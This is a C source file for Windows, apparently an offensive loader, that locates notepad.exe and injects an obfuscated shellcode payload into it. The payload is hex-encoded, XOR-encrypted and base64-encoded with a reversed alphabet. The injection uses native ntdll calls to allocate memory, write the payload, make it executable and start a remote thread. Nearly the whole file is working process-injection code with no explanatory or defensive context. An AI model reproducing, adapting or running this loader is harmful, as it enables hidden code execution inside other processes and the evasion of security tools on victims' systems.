#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include "injection.h"

void xor_decrypt(unsigned char* data, int length, unsigned char key) {
    for (int i = 0; i < length; i++) {
        data[i] ^= key;
    }
}

const char* base64_chars = "ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba0987654321+/";
int is_base64(unsigned char c) {
    return (strchr(base64_chars, c) != NULL);
}

int base64_decode(const char* input, unsigned char* output) {
    int len = strlen(input);
    int i = 0, j = 0;
    unsigned char char_array_4[4], char_array_3[3];
    int output_len = 0;
    while (len-- && (input[i] != '=') && is_base64(input[i])) {
        char_array_4[j++] = input[i]; i++;
        if (j == 4) {
            for (j = 0; j < 4; j++) {
                char_array_4[j] = (unsigned char)(strchr(base64_chars, char_array_4[j]) - base64_chars);
            }
            char_array_3[0] = (char_array_4[0] << 2) | (char_array_4[1] >> 4);
            char_array_3[1] = ((char_array_4[1] & 15) << 4) | (char_array_4[2] >> 2);
            char_array_3[2] = ((char_array_4[2] & 3) << 6) | char_array_4[3];

            for (j = 0; j < 3; j++) {
                output[output_len++] = char_array_3[j];
            }
            j = 0;
        }
    }
    return output_len;
}

int hex_decode(const char* hex, unsigned char* output) {
    int len = strlen(hex);
    if (len % 2 != 0) return 0; // Invalid hex length
    for (int i = 0; i < len; i += 2) {
        sscanf_s(hex + i, "%2hhx", &output[i / 2], 2);
    }
    return len / 2;
}

void print_hex(const unsigned char* data, int length) {
    for (int i = 0; i < length; i++) {
        printf("\\x%02x", data[i]);
        if ((i + 1) % 14 == 0 && i != length - 1)
            printf("\"\n\"");
    }
}

void decodeShellcode() {
    printf("aaa");
}

DWORD GetProcessID(const char* processName) {
    PROCESSENTRY32 pe32 = { 0 };
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return 0;

    pe32.dwSize = sizeof(PROCESSENTRY32);
    if (Process32First(hSnap, &pe32)) {
        do {
            wchar_t wideName[MAX_PATH];
            MultiByteToWideChar(CP_ACP, 0, processName, -1, wideName, MAX_PATH);
            if (_wcsicmp(pe32.szExeFile, wideName) == 0) {
                CloseHandle(hSnap);
                return pe32.th32ProcessID;
            }
        } while (Process32Next(hSnap, &pe32));
    }
    CloseHandle(hSnap);
    return 0;
}

void InjectShellcodeNative(DWORD pid) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");

    xd_NtOpenProcess NtOpenProcess = (xd_NtOpenProcess)GetNtFunctionAddress("NtOpenProcess", ntdll);
    xd_NtAllocateVirtualMemory NtAllocateVirtualMemory = (xd_NtAllocateVirtualMemory)GetNtFunctionAddress("NtAllocateVirtualMemory", ntdll);
    xd_NtWriteVirtualMemory NtWriteVirtualMemory = (xd_NtWriteVirtualMemory)GetNtFunctionAddress("NtWriteVirtualMemory", ntdll);
    xd_NtProtectVirtualMemory NtProtectVirtualMemory = (xd_NtProtectVirtualMemory)GetNtFunctionAddress("NtProtectVirtualMemory", ntdll);
    xd_NtCreateThreadEx NtCreateThreadEx = (xd_NtCreateThreadEx)GetNtFunctionAddress("NtCreateThreadEx", ntdll);
    xd_NtWaitForSingleObject NtWaitForSingleObject = (xd_NtWaitForSingleObject)GetNtFunctionAddress("NtWaitForSingleObject", ntdll);
    xd_NtFreeVirtualMemory NtFreeVirtualMemory = (xd_NtFreeVirtualMemory)GetNtFunctionAddress("NtFreeVirtualMemory", ntdll);
    xd_NtClose NtClose = (xd_NtClose)GetNtFunctionAddress("NtClose", ntdll);

    OBJECT_ATTRIBUTES objAttr = { 0 };
    CLIENT_ID clientId = { 0 };
    HANDLE hProcess = NULL;
    DWORD OldProtection = 0;
    clientId.UniqueProcess = (HANDLE)(ULONG_PTR)pid;
    clientId.UniqueThread = 0;
    InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);


    const char* encrypted_hex = "85fcd8fd9fe1fdc6cbf0f0f0f0fcffe3e0eff3e2e2fdf9e2ebecd8e5ecc4f3e3e2f8cde2fefcd8e5ecd8f3eeededf9fbe2f0819de2dac1f8d89dfbe0e2fdf9f0c3fdc9d9dff0f8c2f8fcf9f3c8e093f3f0d2f9d899effbf3ececd8e5ecd8f2e5e0dbc9f8f0ddf3c4dee9dee8f2cef8e1d9e9f8f0f0f0f2e5def8def0f0f0f3f8d9d2f39aeb9adef39afce2e5e0f2f3e0e2e0f9e0d89adee89c93ebe7e4d2c5f88598c5f3d8cbe2f8e2f0f9eee2fdf9f0e0d2f9fbfdd0c9f3f0d2fc9c9cf9e9c9edf0e7e4fbf0d9ffe6ddff9392ffd9fcd89af0dae2e0f9e0ebdafee5fdfcd9fcd89af0d2e2e0f9e0e0e8c2fcd8fcffe8e0efd9f8f0ddf3dceeefc1f3eefcffebe0efc1f8de81cedee0efe5859cffd9f3eeefc1f8d8c9e5c1e2858585859393fbcfc7ddcbe4c598cbe4def0f0e0efebfbd8dcebf8dedcc8def0e0f0f0e2e8c7c5e2d3cef2f0f3ffd2cefadef398daffece2e8c7daedf8c7c9e0d3c1e4ddc8e8f9859befe4d8dcc1c6f0e0fcf0f0ffc5f3ccd8c4f0d0cefd8593eec6fae0ef9fe0ecfc9ac9c8ec9ac9cefcdb85cefcd8fbcedadb85cefcd8fbceecfe9e9ede85df9ce185efe2f8c7f9d0d9f3f3eefcc8fb9cdad8fb81ecfe9ec4d0ef9ae8df85efd9d2f39af2dac785cbc7e9c59efbe4f0f0f0f3f8de81cee0e2f8c7d8ededf9fbd0dee3f3eefcd8fb81ecfe9ef0cdc7f8e98585efde85def0dfc5eff8de98e0dee9c6c792d0daf3f3eeeedef0fcf0f0f0e0efd9f8d8dffbf8e4d2c5f3ccc5d8daec81e98593ecd8fbce9ac4fbc99a9ac9c8ecc4fb98fcd8fb92dad8fb81ecfe9ef0cdc7f8e98585efde85def0dfe2d9e8e0efddebd0f0f3f0f0f0f3f3eefec6f0eedafe9ef2c898e1e4e185efef93c5f3ccc7efccedeef98593ecc785cbccda9885858585e2f0f9fde2f2c7fee2f8e992ddd3e3f38581dde8d0def3ebe2d2dff298e5eed8efcf85ef";
    int hex_len = strlen(encrypted_hex) / 2;
    unsigned char* decoded_hex = (unsigned char*)malloc(hex_len);
    if (!decoded_hex) {
        printf("Memory allocation failed.\n");
        return;
    }

    int decoded_len = hex_decode(encrypted_hex, decoded_hex);
    if (decoded_len == 0) {
        printf("Hexadecimal decoding failed.\n");
        free(decoded_hex);
        return;
    }

    xor_decrypt(decoded_hex, decoded_len, 0xAA);
    // decoded_hex[decoded_len] = '\0';

    unsigned char* base64_decoded = (unsigned char*)malloc(decoded_len);
    if (!base64_decoded) {
        printf("Memory allocation failed.\n");
        free(decoded_hex);
        return;
    }

    int shellcode_len = base64_decode((char*)decoded_hex, base64_decoded);
    if (shellcode_len == 0) {
        printf("Base64 decoding failed.\n");
        free(decoded_hex);
        free(base64_decoded);
        return;
    }

    // print_hex(base64_decoded, shellcode_len);
    // printf("aaa");
    SIZE_T shellcode_size = shellcode_len;



    NTSTATUS status = NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objAttr, &clientId);
    if (status != STATUS_SUCCESS || hProcess == NULL) {
        PRINTXD("NtOpenProcess", status);
        return;
    }

    PVOID baseAddr = NULL;
    SIZE_T regionSize = shellcode_len;
    status = NtAllocateVirtualMemory(hProcess, &baseAddr, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (status != STATUS_SUCCESS) {
        PRINTXD("NtAllocateVirtualMemory", status);
        NtClose(hProcess);
        return;
    }

    status = NtWriteVirtualMemory(hProcess, baseAddr, base64_decoded, shellcode_len, NULL);
    if (status != STATUS_SUCCESS) {
        PRINTXD("NtWriteVirtualMemory", status);
        NtFreeVirtualMemory(hProcess, &baseAddr, &regionSize, MEM_RELEASE);
        NtClose(hProcess);
        return;
    }


    status = NtProtectVirtualMemory(hProcess, &baseAddr, &regionSize, PAGE_EXECUTE_READ, &OldProtection);
    if (STATUS_SUCCESS != status) {
        PRINTXD("NtProtectVirtualMemory", status);
        NtFreeVirtualMemory(hProcess, &baseAddr, &regionSize, MEM_RELEASE);
        NtClose(hProcess);
        return;
    }

    HANDLE hThread = NULL;
    status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, baseAddr, NULL, 0, 0, 0, 0, NULL);
    if (status != STATUS_SUCCESS) {
        PRINTXD("NtCreateThreadEx", status);
        NtFreeVirtualMemory(hProcess, &baseAddr, &regionSize, MEM_RELEASE);
        NtClose(hProcess);
        return;
    }
    if (hThread != NULL) {
        NtWaitForSingleObject(hThread, FALSE, NULL);
    }
    NtClose(hThread);

    NtFreeVirtualMemory(hProcess, &baseAddr, &regionSize, MEM_RELEASE);
    NtClose(hProcess);
}

int main() {
    DWORD pid = GetProcessID("notepad.exe");
    if (pid == 0) {
        printf("Target process not found.\n");
        return 1;
    }
    InjectShellcodeNative(pid);
    return 0;
}
